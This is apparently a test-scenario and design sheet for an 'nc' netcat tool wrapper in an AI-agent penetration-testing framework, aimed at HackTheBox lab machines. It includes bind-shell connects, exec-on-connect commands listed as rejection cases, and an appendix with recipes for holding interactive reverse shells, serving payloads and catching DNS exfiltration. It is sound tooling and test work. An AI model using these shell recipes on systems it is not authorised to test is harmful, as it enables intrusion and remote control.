# nc — Tier A scenarios

Single test sheet for the NEW `nc` tool (kind:cli, multi-binary
toolkit: nc / ncat / socat / netcat-traditional). Sibling of the
existing `netcat` (kind:mcp) tool — see see_also and reject_flags
for the boundary.

Sections:
1. Recommended HTB box for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20)
4. Failure-signature live-verify cases (≥3)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box for live verification

`nc` is most useful for ad-hoc port probes during recon and for
connecting to bind shells planted by an exploit. Since EVERY HTB box
exposes at least one TCP port, almost any target works — pick based on
which other tools you're exercising in the same engagement.

Recommended boxes (any one will exercise the toolkit):

- **Cap (10.10.10.245)**: ssh + http + ftp. Multiple ports for nc -z
  range checks and ncat banner grabs.
- **Tabby (10.10.10.194)**: ajp + tomcat + ssh. Useful for non-HTTP
  banner-grab work (AJP on 8009).
- **Validation (10.129.95.235)**: web + ssh + db. Useful for UDP
  send (DNS-shaped queries) once foothold is established.
- **Any box with port 80 + 22**: 5-second smoke test target.

For **bind-shell connect specifically**, find any HTB box where an
exploit pops a bind shell on a known port (older Windows boxes, e.g.,
Legacy 10.10.10.4 with MS08-067 → bind 4444). After the exploit:

```
nc -w 5 10.10.10.4 4444 < /session/cmds.txt
```

For **UDP send specifically**, any box with DNS open (port 53), or any
HTB-Sherlocks pcap-replay challenge. Stage the packed datagram bytes
in `/session/payload.bin` and pipe via stdin.

Persistent test directory: standard `/session/` mount inside the
cli_in_container container.

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — smoke test: confirm all four binaries are functional

```
Run nc -h, ncat --version, socat -V, and nc.traditional -h one at a time so I can confirm the four nc-toolkit binaries are on PATH and working.
```

**Watch:** Agent emits four separate calls, each to a different
`binary:`. target=`null` for all four. nc -h prints usage to stderr.
ncat --version prints "Ncat: Version 7.94 ( https://nmap.org/ncat )".
socat -V prints version banner. nc.traditional -h prints the legacy
flag list. If any binary isn't on PATH the call fails with `command
not found` (container build issue).

### S2 — single-port TCP open check

```
Check whether port 22 is open on 10.10.10.5 with a 3-second timeout.
```

**Watch:** Agent emits `nc -z -v -w 3 10.10.10.5 22`. binary=`nc`.
target=`10.10.10.5`. Expected stderr: `Connection to 10.10.10.5 22 port
[tcp/ssh] succeeded!` (open) or `Connection refused` / `timed out`
(closed/filtered). exit_code 0 = open, non-zero = not-open. Verifies
the canonical `-z` port-check flow.

### S3 — small-range TCP sweep

```
Quick-check ports 22-1024 on 10.10.10.5 to find the open ones.
```

**Watch:** Agent emits `nc -z -v -w 3 10.10.10.5 22-1024`. binary=
`nc`. target=`10.10.10.5`. stderr lists one line per port (open /
refused / timed out). Open ports go to stderr ONLY — stdout is empty.
Slower than nmap for ranges this large; see gotchas.

### S4 — banner grab via ncat

```
Open a TCP connection to 10.10.10.5 port 22 and capture whatever banner the service sends, then close.
```

**Watch:** Agent emits `ncat --send-only --recv-only -w 3 10.10.10.5
22`. binary=`ncat`. target=`10.10.10.5`. stdout is the SSH banner
(e.g., `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4`). Verifies the
clean banner-grab pattern (no shell redirect needed).

### S5 — UDP datagram send (DNS query)

```
Send the contents of /session/dns-query.bin as a UDP datagram to 10.10.10.5 port 53 with a 1-second wait timeout.
```

**Watch:** Agent emits `nc -u -w 1 10.10.10.5 53` with stdin piped
from /session/dns-query.bin. binary=`nc`. target=`10.10.10.5`. stdout
is whatever the DNS server replies (if anything). exit_code 0 even if
no reply (UDP is connectionless). Verifies UDP send path.

### S6 — connect to bind shell

```
A previous exploit popped a bind shell on 10.10.10.5:4444. Connect to it, run "id; whoami; uname -a", and capture the output.
```

**Watch:** Agent emits `nc -w 5 10.10.10.5 4444` with stdin =
`id\nwhoami\nuname -a\nexit\n`. binary=`nc`. target=`10.10.10.5`.
stdout is the remote shell's output. Connection closes when the
remote shell exits (or stdin EOF triggers it). For SUSTAINED shell
state, the agent should pivot to `shell-session` (kind:mcp).

### S7 — TLS banner grab

```
Connect to 10.10.10.5 port 443 over TLS and capture the HTTPS service banner.
```

**Watch:** Agent emits `ncat --ssl -w 5 10.10.10.5 443`. binary=
`ncat`. target=`10.10.10.5`. ncat performs the TLS handshake; stdout
is the response (typically empty for HTTPS without a request). Useful
for testing whether TLS handshakes succeed (cert verification, ALPN).

### S8 — multi-binary dispatch (socat for stdio bridge)

```
Bridge stdin/stdout to a TCP connection to 10.10.10.5:80 using socat.
```

**Watch:** Agent emits `socat - TCP:10.10.10.5:80`. binary=`socat`.
Expected target=`10.10.10.5` IF the parser handles socat's ADDR
syntax — but this is an OPEN QUESTION (see §5). stdout is bidirectional
(reads from peer, writes from local stdin). Closes when either side
closes.

### S9 — reject_flags trap (-l listener attempt)

```
Start a TCP listener on port 4444 to catch a reverse shell.
```

**Watch:** Agent should NOT emit `nc -lvp 4444`. -l is in
reject_flags. Two acceptable behaviors: (a) cli_in_container parser
hard-rejects with a clear error pointing to the `netcat` (kind:mcp)
tool, OR (b) the agent's planner detects the listener intent and
routes to `netcat` directly. Either way, no actual nc -l process
should be spawned. Documents the kind:cli vs kind:mcp boundary.

### S10 — reject_flags trap (-e exec attempt)

```
Use nc to connect to 10.10.10.5:4444 and execute /bin/sh on connection.
```

**Watch:** Agent should NOT emit `nc -e /bin/sh 10.10.10.5 4444`. -e
is in reject_flags (backdoor primitive). cli_in_container rejects.
The legitimate alternative is to connect with plain nc and pipe
shell commands via stdin (S6) — no -e flag needed.

### S11 — failure: connection refused

```
Try to connect to 10.10.10.5 port 9999 (closed port).
```

**Watch:** Agent emits `nc -z -v -w 3 10.10.10.5 9999`. binary=`nc`.
target=`10.10.10.5`. stderr: `Ncat: Connection refused.` or `nc:
connect to 10.10.10.5 port 9999 (tcp) failed: Connection refused`.
exit_code non-zero. Failure classified via signal `Connection refused`.

### S12 — failure: DNS resolution

```
Try to connect to nonexistent.invalid port 80.
```

**Watch:** Agent emits `nc -w 3 nonexistent.invalid 80`. binary=`nc`.
target=`nonexistent.invalid`. stderr: `nc: getaddrinfo for host
"nonexistent.invalid" port 80: Name or service not known` or
ncat's `Could not resolve hostname`. exit_code non-zero. Failure
classified via signal `Name or service not known`.

### S13 — failure: missing required positional

```
Run nc -z -v -w 3 (no host or port).
```

**Watch:** Agent emits `nc -z -v -w 3` (no target). binary=`nc`.
target=`null`. nc prints `usage: nc ...` to stderr; exit_code
non-zero. Failure classified via signal `usage: nc`. Remediation:
add the host and port positionals.

### S14 — flag overlap (UDP via different binaries)

```
Send a UDP datagram to 10.10.10.5 port 53 with both nc and socat — confirm they behave equivalently.
```

**Watch:** Two calls.
(a) `nc -u -w 1 10.10.10.5 53` (binary=`nc`, target=`10.10.10.5`).
(b) `socat -T 1 - UDP:10.10.10.5:53` (binary=`socat`, target may be
ambiguous in extraction). Both succeed; stdout is the UDP reply (if
any). Documents the cross-binary equivalence + the socat ADDR
extraction edge.

---

## 3. Target-extraction adversarial cases (≥20)

The `nc` tool.yaml declares ONE target_extraction rule:

```yaml
- rule: "first_non_flag_positional"
  pattern: '^([^:/?#\s]+)$'
  group: 1
  parse_as: "raw"
```

The rule walks argv looking for the first positional that's not a
flag value. value_flags ensures -w / -p / -s / -i / -X / -x / -T / -O
values are NOT misread as positionals.

reject_flags rejects -l, -k, -L, --listen, --keep-open, --exec,
--sh-exec, -e, -c (listener / exec-on-connect flags).

### Happy-path cases (host-extraction must succeed)

| # | Binary | Command | Expected target | Notes |
|---|---|---|---|---|
| 1 | nc | `-z -v -w 3 10.10.10.5 22` | `10.10.10.5` | Canonical port check. |
| 2 | nc | `-z -v -w 3 10.10.10.5 22-1024` | `10.10.10.5` | Range check; range is the port positional. |
| 3 | nc | `-w 5 target.htb 4444` | `target.htb` | FQDN target. |
| 4 | nc | `-u -w 1 10.10.10.5 53` | `10.10.10.5` | UDP send. |
| 5 | nc | `10.10.10.5 4444` | `10.10.10.5` | No flags; pure positional. |
| 6 | ncat | `--send-only --recv-only -w 3 10.10.10.5 22` | `10.10.10.5` | ncat banner grab. |
| 7 | ncat | `--ssl -w 5 10.10.10.5 443` | `10.10.10.5` | TLS connect. |
| 8 | ncat | `--proxy 10.0.0.1:8080 --proxy-type http -w 5 10.10.10.5 80` | `10.10.10.5` | Proxy CONNECT — proxy host MUST NOT match (its value is consumed by --proxy). |
| 9 | nc.traditional | `-w 3 10.10.10.5 22` | `10.10.10.5` | Legacy nc binary. |
| 10 | nc | `-n -z -v -w 3 10.10.10.5 22` | `10.10.10.5` | -n (no DNS) is boolean — listed in value_flags for safety; positional walk continues. |

### Help / introspection (target=null)

| # | Binary | Command | Expected | Notes |
|---|---|---|---|---|
| H1 | nc | `-h` | `target=null` | Help. |
| H2 | ncat | `-h` | `target=null` | Help (long flag list). |
| H3 | ncat | `--version` | `target=null` | Version. |
| H4 | socat | `-h` | `target=null` | Help (options only). |
| H5 | socat | `-hh` | `target=null` | Full help with address types. |
| H6 | socat | `-V` | `target=null` | Version. |
| H7 | nc.traditional | `-h` | `target=null` | Legacy nc help. |

### Adversarial — value_flag traps & "looks like a target" invariants

| # | Binary | Command | Expected target | Notes |
|---|---|---|---|---|
| F1 | nc | `-w 3 -s 10.0.0.5 10.10.10.5 22` | `10.10.10.5` | -s value (10.0.0.5) is SOURCE IP — must NOT extract as target. value_flag for -s consumes the next argv. |
| F2 | nc | `-p 31337 -s 10.0.0.5 10.10.10.5 22` | `10.10.10.5` | -p value (31337) is SOURCE PORT (integer) — not a target. -s value (10.0.0.5) also not a target. |
| F3 | nc | `-w 3 -i 1 10.10.10.5 22` | `10.10.10.5` | -i value (1) is line-feed interval (integer) — not a target. |
| F4 | nc | `-w 3 -q 5 10.10.10.5 22` | `10.10.10.5` | -q value (5) is quit-after-EOF seconds — not a target. |
| F5 | nc | `-X connect -x 10.99.99.99:8080 -w 5 10.10.10.5 80` | `10.10.10.5` | -X value (connect) is proxy type; -x value (10.99.99.99:8080) is proxy host:port — neither is the target. |
| F6 | ncat | `--proxy-auth user:pass --proxy 10.99.99.99:8080 -w 5 10.10.10.5 80` | `10.10.10.5` | --proxy-auth value (user:pass) and --proxy value (10.99.99.99:8080) consumed; target is the FINAL positional. |
| F7 | ncat | `--ssl-cert /session/cert.pem --ssl-key /session/key.pem -w 5 10.10.10.5 443` | `10.10.10.5` | TLS cert / key paths consumed; target is the host. |
| F8 | ncat | `--source 10.0.0.5 --source-port 31337 -w 5 10.10.10.5 22` | `10.10.10.5` | Long-form source flags — values consumed. |
| F9 | nc | `-w 3 10.10.10.5-with-suffix 22` | `10.10.10.5-with-suffix` | DNS name with embedded dash + IP-like prefix. The regex matches the whole token. (Edge case: HTB-style hostnames sometimes look IP-ish.) |
| F10 | nc | `-w 3 [2001:db8::1] 22` | `[2001:db8::1]` OR `2001:db8::1` | IPv6 in brackets (nc / ncat both support this form). The regex captures `[2001:db8::1]` because brackets are not in the exclusion class. Plugin should handle either form. |
| F11 | nc | `-w 3 10.10.10.5 22 22-1024` | `10.10.10.5` | Two port positionals — first is target, second is port (single 22), third (22-1024) is ignored / extraneous. nc may error; target_extraction still picks the first positional. |
| F12 | nc | `-T mptcp -w 3 10.10.10.5 22` | `10.10.10.5` | -T value (mptcp) is a TLS keylog / TOS option — consumed; not a target. |
| F13 | nc | `-O 16384 -w 3 10.10.10.5 22` | `10.10.10.5` | -O value (TCP_NODELAY size, integer) consumed. |
| F14 | ncat | `-d 5 -w 3 10.10.10.5 22` | `10.10.10.5` | ncat -d is delay between connects (integer) — value consumed. NB: nc -d has DIFFERENT meaning (detach stdin, boolean) — same letter, different semantics; binary-scoped parsing handles. |
| F15 | nc | `-w 3 10.10.10.5 22 'banner-grab-string'` | `10.10.10.5` | Trailing positional (the banner string in stdin payload) — NOT a target. The first positional after flags is the host. |
| F16 | ncat | `-o /session/hex-dump.txt -w 5 10.10.10.5 80` | `10.10.10.5` | ncat -o (output hex dump file path) consumed; target is the host. |
| F17 | ncat | `-x /session/ascii-dump.txt -w 5 10.10.10.5 80` | `10.10.10.5` | ncat -x value: this is OVERLOADED — same letter is `proxy host:port` (value_flag) AND `output ascii dump file path` (value_flag). Both meanings consume the next argv; target extraction works either way. CONFIRM in live testing which meaning ncat applies (depends on whether --proxy is also given). |
| F18 | nc | `-w 3 user@10.10.10.5 22` | `user@10.10.10.5` OR `10.10.10.5` (depends on regex) | nc DOES NOT support user@ prefix (that's ssh syntax) — but if the LLM mis-typed it, the regex sees the full token. Operational error; targeting still extracts something. |
| F19 | nc | `-w 3 10.10.10.5/maybe 22` | NO MATCH (regex stops at `/`) — likely null OR partial | Regex excludes `/`. Operationally, nc rejects host-with-path; doc the parser's behavior. |
| F20 | nc | `-w 3 10.10.10.5:22 22` | NO MATCH (regex stops at `:`) — likely null | Regex excludes `:`. Operational: nc rejects host:port shorthand. Documents the exclusion class. |
| F21 | nc | `-z -v -w 3 -- 10.10.10.5 22` | `10.10.10.5` | `--` separates flags from positionals; nc accepts. The parser should skip `--` and pick the next positional. |
| F22 | nc | `-w 3 10.10.10.5 22 < /session/payload.bin` | `10.10.10.5` | The `< /session/payload.bin` is a SHELL redirect — cli_in_container has NO SHELL. The redirect token would be passed as a literal arg (incorrect). Use stdin pipe instead (cli_in_container's stdin support). target_extraction still gets 10.10.10.5. |
| F23 | nc | `-w 3 'host with space' 22` | `host with space` (probably) — operational error | Quoted hostname with spaces. nc rejects (DNS resolution fails). Regex's `\s` exclusion means space breaks the match — actual behavior depends on whether the shell-like quoting is preserved. Doc and live-verify. |
| F24 | socat | `- TCP:10.10.10.5:80` | UNCERTAIN — likely `-` (dash) extracted as the first positional | OPEN QUESTION. socat's first positional is `-` (STDIO); the second is `TCP:10.10.10.5:80`. Neither matches the regex cleanly as a host. Parser may extract `-` (dash) or `TCP:10.10.10.5:80` (with colons — fails the exclusion class). Document; defer to runtime. |
| F25 | socat | `-T 3 - UDP:10.10.10.5:53` | UNCERTAIN — same socat ambiguity | Same edge as F24 but with global -T option. The -T value (3) is consumed; first non-flag positional is `-`. |

### Reject_flags cases (these MUST be rejected at parse time)

| # | Binary | Command | Expected | Notes |
|---|---|---|---|---|
| R1 | nc | `-l -p 4444` | REJECTED | -l in reject_flags. Route to `netcat` kind:mcp tool. |
| R2 | nc | `-l -k -p 8080` | REJECTED | -l + -k both rejected. |
| R3 | nc | `-L -p 4444` | REJECTED | -L (netcat-traditional alternate listen) rejected. |
| R4 | ncat | `--listen --keep-open -p 4444` | REJECTED | Long-form listener flags rejected. |
| R5 | ncat | `--http-server` | NOT in reject_flags but OUT OF SCOPE | --http-server is a listener mode (uses ncat as a tiny HTTP server). Listed in value_flags but should logically be rejected. OPEN QUESTION whether to add it to reject_flags. |
| R6 | nc | `-e /bin/sh 10.10.10.5 4444` | REJECTED | -e (exec on connect — netcat-traditional) rejected for safety. |
| R7 | nc | `-c /bin/bash 10.10.10.5 4444` | REJECTED | -c (alternate exec — netcat-traditional) rejected for safety. |
| R8 | ncat | `--exec /bin/sh 10.10.10.5 4444` | REJECTED | --exec rejected for safety. |
| R9 | ncat | `--sh-exec 'whoami; id' 10.10.10.5 4444` | REJECTED | --sh-exec rejected for safety. |
| R10 | socat | `TCP-LISTEN:4444 EXEC:/bin/sh` | NOT FORMALLY REJECTED (ADDR token, not flag) | OPEN QUESTION. socat LISTEN-mode ADDRs are positionals, not flags — reject_flags doesn't catch them. Ideally the parser checks the first ADDR for `LISTEN` substring and rejects. Currently relies on agent discipline + see_also.netcat reason. |

### Multi-binary dispatch traps

| # | Setup | What COULD go wrong | What MUST happen |
|---|---|---|---|
| D1 | Agent emits `binary: nc` but argv has ncat-only flags (`--ssl`, `--send-only`). | nc rejects with `unknown option`. | Use `binary: ncat`. The DSL's `binary:` field IS THE BINARY — argv is appended. Mixing them is a recipe error. |
| D2 | Agent emits `binary: nc` with `-e /bin/sh`. | Even on netcat-traditional this is rejected; on netcat-openbsd -e doesn't exist (different error). | reject_flags catches -e regardless. Use scp / ssh for legitimate command execution. |
| D3 | Agent emits `binary: socat` with `socat TCP-LISTEN:4444 EXEC:/bin/sh`. | LISTEN ADDR is out of scope; should route to `netcat` kind:mcp. | Currently NOT formally rejected (socat ADDRs are positionals). Agent must self-route. See R10 + Open Question §5.2. |
| D4 | Agent emits `nc` without `-w`. | Connection hangs on filtered ports until kernel timeout (75+ s) — exceeds idle_timeout_seconds (60 s) → wrapper trips. | Always pass `-w 3` (or appropriate). Documented in gotchas. |
| D5 | Agent emits `nc -uz host port` and infers OPEN from exit_code 0. | UDP -z is unreliable; exit 0 doesn't mean OPEN (UDP has no RST). | Don't trust nc -uz for UDP scanning. Use nmap -sU instead. Documented in gotchas. |
| D6 | Agent emits `nc host port < /dev/null` thinking shell-redirect works. | cli_in_container has NO SHELL — `< /dev/null` is a literal arg, nc rejects. | Use ncat `--send-only --recv-only` instead (binary-level half-close). Documented in gotchas. |
| D7 | Agent emits the SAME flag letter (-d, -t, -u, -l) across binaries assuming consistent semantics. | nc -d = detach stdin (boolean); ncat -d = delay between connects (integer); socat -d = increase debug verbosity. Same letter, three different meanings. | The cli_in_container parser is BINARY-SCOPED — the right meaning resolves at parse time. The HUMAN-side risk is the LLM choosing the wrong binary for the flag intent. |

### Stdin / shell trap (cli_in_container has no shell)

| # | Command (LLM might naively try) | What happens | Correct shape |
|---|---|---|---|
| P1 | `nc -w 3 host port < /dev/null` | cli_in_container HAS NO SHELL. `< /dev/null` is passed as a LITERAL arg → nc rejects with `usage`. | Use `ncat --send-only --recv-only -w 3 host port` (binary-level half-close, no shell needed). |
| P2 | `cat /session/payload.bin \| nc -u -w 1 host 53` | Same — no shell, no pipe. The `|` is a literal. | Pipe the bytes via cli_in_container's stdin pipe (the agent stages /session/payload.bin and tells cli_in_container to read it as stdin). |
| P3 | `nc host port; echo done` | Same — `;` is a literal. | Run two separate cli_in_container calls. |
| P4 | `for p in 22 80 443; do nc -z host $p; done` | No shell loop. | Use `nc -z -v -w 3 host 22-443` (range form) or three separate calls. |
| P5 | `nc -e /bin/sh host port` | Even if the shell worked, -e is in reject_flags. | Use connect + stdin (S6) — pipe shell commands via stdin. |

---

## 4. Failure-signature live-verify cases (≥3)

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | DNS | `nc -w 3 nonexistent.invalid 80` | `Name or service not known` OR `Could not resolve hostname` | PENDING live verify |
| 2 | TCP | `nc -z -v -w 3 10.10.10.5 9999` (closed port) | `Connection refused` | PENDING live verify |
| 3 | TCP | `nc -z -v -w 3 10.99.99.99 80` (unroutable) | `No route to host` OR `Connection timed out` | PENDING live verify |
| 4 | TCP | `nc -z -v 10.10.10.5 22` (no -w, filtered port) | hang → idle_timeout_seconds (60 s) tripped | PENDING live verify (use a filtered port or unroutable IP without -w) |
| 5 | Permission | `nc -p 80 10.10.10.5 22` (low source port without CAP_NET_BIND_SERVICE) | `Permission denied` OR `Operation not permitted` | PENDING live verify |
| 6 | Argument | `nc -z -v -w 3` (no host or port) | `usage: nc` | PENDING live verify |
| 7 | Argument | `nc -w 10.10.10.5 22` (-w without integer) | `invalid argument` OR `missing argument` | PENDING live verify |
| 8 | Argument | `nc --notaflag 10.10.10.5 22` | `unknown option` | PENDING live verify |
| 9 | Listener-rejection | `nc -lvp 4444` | reject_flags fires → `rejected` (parser-level error) | PENDING live verify |
| 10 | Listener-rejection | `ncat --listen --keep-open -p 4444` | reject_flags fires (long-form) → `rejected` | PENDING live verify |
| 11 | Listener-rejection | `nc -e /bin/sh 10.10.10.5 4444` | reject_flags fires (-e) → `rejected` | PENDING live verify |
| 12 | Source-port | `nc -p 31337 host port` then re-run before TIME_WAIT clears | `Address already in use` | PENDING live verify |
| 13 | Argument | `socat TCP:10.10.10.5:badport` | `socat[N] E ... unknown service / invalid port` | PENDING live verify |

### Layer diversity (SKILL #11) — achieved

6 distinct verifiable layers exercised: DNS, TCP, permission,
argparse-spelling/value, listener-rejection, source-port-conflict.

---

## 5. Open questions

1. **target_extraction precise rule — host vs port positional.** The
   regex extracts the FIRST non-flag positional. For `nc -w 3 10.10.10.5
   22`, after value_flags consume `-w 3`, the next two positionals are
   `10.10.10.5` (host) and `22` (port). The regex matches the host
   correctly. But for inverted forms — `nc 10.10.10.5 22 -w 3` (flag
   AFTER positional, argparse permissive) — the parser must walk past
   `-w 3` correctly. Verify the parser handles flag-after-positional
   layouts. Same shape ssh deals with.

2. **socat ADDR-pair syntax — host extraction.** socat takes `socat
   [OPTS] ADDR1 ADDR2` where each ADDR is `TYPE:host:port[,opts]`
   (e.g., `TCP:10.10.10.5:80`). The first positional is one of these
   ADDR tokens, NOT a bare hostname. The regex `^([^:/?#\s]+)$`
   excludes `:` so `TCP:10.10.10.5:80` does NOT match. Likely outcome:
   target_extraction returns null for socat invocations. Decisions:
   - (a) Accept null target for socat; document in gotchas; rely on
     scope-validation falling back to no-validation.
   - (b) Add a socat-specific extraction rule that parses the ADDR
     and pulls the host between the colons.
   - (c) Treat socat as out-of-scope for the kind:cli model (route
     all socat work through some other mechanism).
   Currently doing (a) — accept null target for socat. If we see
   socat used heavily in real engagements, escalate to (b).

3. **socat LISTEN-mode ADDRs not in reject_flags.** socat's listener
   verbs (TCP-LISTEN, OPENSSL-LISTEN, FORK, EXEC, SYSTEM, UNIX-LISTEN)
   are POSITIONALS, not flags — reject_flags doesn't catch them. An
   LLM that emits `socat TCP-LISTEN:4444 EXEC:/bin/sh` would create a
   stateful listener that can't survive cli_in_container's one-shot
   model. Mitigations:
   - (a) Add an ADDR-token check in the parser: reject any first
     ADDR containing `LISTEN` or `EXEC` or `SYSTEM` or `FORK`.
   - (b) Rely on agent discipline + see_also.netcat reason +
     reject_flags_reason narrative.
   - (c) Add a usage_pattern that explicitly demonstrates the
     out-of-scope socat shapes and routes them to netcat kind:mcp.
   Currently doing (b). Promote to (a) if in live runs we see LISTEN
   socat invocations slipping through.

4. **Multi-binary dispatch — flag-letter overlap across nc / ncat /
   socat.** -d, -t, -u, -l, -s, -x, -T, -V all have different
   meanings across the four binaries (some collide WITHIN nc / ncat
   too). value_flags is a UNION; the cli_in_container parser is
   binary-scoped, so the right meaning resolves at parse time. Verify
   the parser implementation actually honors binary scoping (i.e.,
   when binary=nc, -d is treated as boolean detach-stdin; when
   binary=ncat, -d is treated as integer delay-value; when
   binary=socat, -d is boolean debug-verbosity). This is the same
   invariant ssh / forensics depend on.

5. **reject_flags scope — listener-flag effectiveness.** The
   reject_flags list catches -l / -k / -L / --listen / --keep-open /
   --exec / --sh-exec / -e / -c. But ncat has a SUBTLE listener
   form: `ncat --http-server` — listed in value_flags but NOT in
   reject_flags. Is this a gap? --http-server creates a
   long-running HTTP server (out-of-scope for kind:cli). Add to
   reject_flags? Currently NO — depending on whether ncat's
   --http-server is used in real workflows. If yes, add to
   reject_flags. If only used in CTF / niche cases, leave in
   value_flags (parser still parses correctly; agent must
   self-discipline).

6. **Image-sharing vs independent image.** Considered both:
   - **Option A (shared image)**: `FROM
     ghcr.io/silicon-works/mcp-tools-netcat:latest` and just COPY
     the new mcp-server.py over. Saves disk space; image size = ~150
     MB. RISK: registry-hash management — when netcat's image
     rebuilds, nc's image must rebuild too OR nc's hash drifts from
     netcat's. Coupling at build time.
   - **Option B (independent image)**: separate Dockerfile installing
     the same package set. Same ~150 MB. Independent rebuild
     schedule; clean hash separation. Slight disk overhead because
     the two images don't share layers (in practice, Docker's content-
     addressable storage WILL dedupe identical layers — netcat's
     apt-install layer and nc's apt-install layer are byte-identical
     and dedupe).
   Decision: Option B (independent). Confirmed via Dockerfile in
   this directory. Reason: simpler hash management, no inter-tool
   build coupling, and Docker's layer dedup means the disk overhead
   is near-zero anyway.

7. **netcat-traditional vs netcat-openbsd default.** Debian / Kali
   ship both packages. The default `nc` symlink points to
   netcat-openbsd. To use the traditional flavor, the agent must
   explicitly call `nc.traditional`. usage_patterns currently target
   the openbsd flavor; should we add traditional patterns for the
   few flags that differ (-c exec, -e exec — both rejected anyway)?
   Currently NO traditional-specific patterns; rely on the
   `binary: nc.traditional` selector + the small-flag-set reject.

8. **UDP unreliability documentation.** The gotchas warn about UDP
   -z being unreliable. Should we go further and ADD `-u -z` to
   reject_flags (force the agent to use nmap -sU instead)? Currently
   NO — `-u` alone (UDP send) is legitimate; only `-u -z` (UDP scan)
   is unreliable. Adding combined-flag reject is complex (the parser
   would need to detect the COMBINATION). Document in gotchas; rely
   on agent judgment.

9. **Stdin-piping support in cli_in_container.** Several usage
   patterns rely on cli_in_container's ability to PIPE stdin into
   the binary (banner grab via empty stdin, UDP send via packed
   bytes, file send). Verify cli_in_container actually supports
   stdin-piping for these cases. If not, the LLM must use ncat
   --send-only (no stdin needed) or stage payloads in a way that
   doesn't require shell redirects.

10. **Source-port and source-IP — bind-address utility.** -s and -p
    flags let the operator specify the local source IP / port for
    the connection. This is RARELY useful (kernel may rewrite; only
    matters for some firewall / IDS tests). Document in gotchas as
    "rarely useful — kernel may rewrite". Consider whether to
    REJECT -s when SOURCE_IP is not bound to a local interface
    (currently the failure_signature `Cannot assign requested
    address` covers this). Currently allow -s; let the kernel
    enforce.

---

## 6. Hand-off

- **Tool**: nc (kind:cli, multi-binary toolkit: nc / ncat / socat /
  netcat-traditional)
- **Status**: tool.yaml authored end-to-end (kind:cli, NO top-level
  binary, per-pattern `binary:` field; 5 min max_runtime; 60 s idle
  for one-shot probes / banner grabs / UDP send;
  target_extraction with first-non-flag-positional regex;
  reject_flags for listener / exec-on-connect flags; ~70 value_flags
  spanning all four binaries — binary-scoped flag-letter overlap
  documented in gotchas); scenarios.md written with 14 narrative
  scenarios, 25 happy/adversarial target-extraction cases, 7 help/
  introspection cases, 10 reject_flags cases, 7 multi-binary
  dispatch traps, 5 stdin / shell traps, 13 failure-signature cases
  across 6 layers.
- **Dockerfile**: NEW Dockerfile authored — independent build (NOT
  layered on netcat). Same package set as netcat (netcat-traditional,
  ncat, socat, iproute2, python3-full). Docker's layer dedup makes
  the disk overhead near-zero.
- **mcp-server.py**: NEW thin kind:cli subclass (~30 LOC). No
  legacy methods registered (this tool is BORN kind:cli — no
  migration). Auto-inherits run_cli from BaseMCPServer (mcp-common
  0.3.0).
- **requirements.txt**: empty (no Python deps beyond mcp-common).
- **Image**: `ghcr.io/silicon-works/mcp-tools-nc:latest` — needs
  initial build during Wave 9 batch. NOT shared with netcat's
  image — separate registry tag, separate hash, independent
  rebuild schedule.
- **Wave 8.2**: of Feature 35 / Tier A migration. FINAL TOOL of
  Wave 8 (the overlap-case cohort: ssh / nc — same kind:cli +
  kind:mcp pattern). Sibling of `netcat` (kind:mcp) which stays
  unchanged for stateful operations.
- **Live-verify pending**: paste S1-S14 against any HTB box (Cap,
  Tabby, Validation, or any box with port 22 / 80 open) for
  end-to-end verification. Failure signatures 1-3 (DNS, TCP-refused,
  no-route) verifiable against any unreachable host; 4 (no -w hang)
  needs a filtered port + missing -w; 5 (permission) needs a low
  source port; 6-8 (argparse) trivial; 9-11 (listener / exec
  rejection) verifies the reject_flags machinery; 12 (source-port
  conflict) needs back-to-back invocations; 13 (socat ADDR error)
  trivial.
- **Cleanup**: NEW directory created at `/home/nightshade/silicon-works/mcp-tools/tools/nc/`.
  No legacy files to remove. Final dir contents: Dockerfile,
  mcp-server.py, requirements.txt, tool.yaml, scenarios.md.

Authored: 2026-04-25.

---

# Appendix A — v2.0: netcat MCP retirement (May 2026)

The legacy `netcat` (kind:mcp) tool was retired in May 2026 and its 14
methods consolidated into THIS tool's tool.yaml as additional
usage_patterns + gotchas. nc v2.0 covers everything netcat MCP did —
listener-mode (-l/-k), HTTPS callbacks (--ssl with auto self-signed),
held interactive reverse shells, HTTP file serving, UDP listeners —
without a separate Python wrapper.

Architecture: `tail -f cmd_log | ncat -lvnp PORT > out_log` pipeline holds
an interactive reverse shell across multiple separate tool-runner spawns.
The listener container holds for cli_in_container's max_runtime_seconds;
sibling containers append commands to cmd_log and read output via the
bash tool / Read primitive. PTY upgrade through the pipeline confirmed
(isatty=True after `python3 -c 'import pty; pty.spawn("/bin/bash")'`).

7 walkthrough scenarios verified empirically 2026-05-08 (with simulated
230ms RTT + 1% loss via `tc qdisc` to mirror Authority's VPN profile).

## A.1 — One-shot TCP listener (-q 2): blind XSS callback proof

Recipe: `ncat -lvnp <port> -q 2 > /session/output/cap-<port>.log`.
Result: payload captured, listener exited cleanly. ✓

## A.2 — HTTP callback receiver (timeout + ncat -k): multi-connection capture

Recipe: `bash -c 'timeout <s> ncat -lvnp <port> -k > .../http.log 2>&1'`.
3 host-side curl probes captured. Mid-flight peek from a SEPARATE container
(simulating tool-runner-B) saw the partial captures while listener still up. ✓

## A.3 — Held interactive reverse shell (THE marquee pattern)

Recipe: `bash -c 'tail -f /session/output/listener-<port>/cmd | ncat -lvnp <port> > /session/output/listener-<port>/out 2>&1'`.
Verified:
- 5 separate spawns appending commands to cmd_log → all executed in order
- MARKER_$$RANDOM pattern resolved correctly for command-completion
- PTY upgrade through pipeline (isatty=True after pty.spawn)
- Position-tracked delta read returned only new bytes
- Liveness heuristic: killed victim → MARKER_DEAD never appeared ✓

## A.4 — python3 HTTP file server: payload delivery

Recipe: `bash -c 'cd /session/output/serve && timeout <s> python3 -m http.server <port>'`.
Pre-staged file via Write tool, victim curl'd successfully. ✓

## A.5 — UDP listener: DNS exfil / ad-hoc capture

Recipe: `bash -c 'timeout <s> ncat -ulvnp <port> > /session/output/udp.log 2>&1'`.
Datagram captured. ✓

## A.6 — UDP send: one-shot probe

Recipe: `echo -n "<data>" | ncat -u -w 2 <host> <port>`. ✓

## A.7 — TCP port-open check: regression test

Existing nc -z pattern still works post-v2.0. ✓

## A.8 — empirical gotcha findings during v2.0 work

```
